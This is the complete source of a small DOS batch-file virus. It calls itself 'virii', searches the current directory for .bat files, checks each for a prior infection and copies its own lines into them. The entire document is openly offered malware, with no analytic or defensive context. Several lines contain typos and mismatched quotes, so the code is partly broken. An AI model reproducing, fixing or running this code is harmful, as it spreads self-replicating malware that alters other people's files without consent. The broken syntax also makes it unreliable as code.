@echo off&gt;nul.virii

if exist %0.bat set virii=%0.bat
if exist %0 ste virii=%0
if !%1==!  goto virii_start
if %1==/infect goto virii_infect
if %1==/find goto virii_find

:virii_start
REM Will find all batch files in current diectory
echo Finding files to infect with virii
for %%a in (*.bat) do command /e:10000 /c %virii% /infect %%a

goto virii_end

:virii_infect
REM This part makes sure virii does not infect itself or
REM previoulsy infected files
echo Checking %2 and making sure it has not been previously infected
set file_virii=%0
find "file_virii=%0" &lt;%2&gt;viriix.bat
call viriix
del viriix.bat
if "%file_virii%=="viriix echo %2 is allready infected
if "%file_virii%--"viriix exit
REM End of check

echo The virii is now infecting %2
type %2 &gt; viriix.bat
find "virii" &lt;%virii%&gt;&gt; viriix.bat

goto virii_end

:virii_end
